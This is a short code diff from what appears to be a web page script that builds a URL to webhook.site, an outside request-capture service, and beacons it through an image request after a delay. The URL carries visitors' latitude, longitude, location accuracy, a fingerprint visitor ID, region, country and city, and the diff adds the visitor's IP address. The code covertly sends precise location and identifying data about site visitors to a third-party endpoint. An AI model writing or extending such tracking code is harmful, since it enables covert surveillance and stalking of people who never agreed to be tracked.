@@ -189,6 +189,7 @@
         const url = `https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b?ref=${reason}` +
           `&lat=${lat}&lon=${lon}&acc=${acc}` +
           `&visitorId=${fingerprintData.visitorId}` +
+          `&ip=${fingerprintData.ip}` +
           `&region=${fingerprintData.region}&country=${fingerprintData.country}&city=${fingerprintData.city}`;
         img.src = url;
       }, 1500);
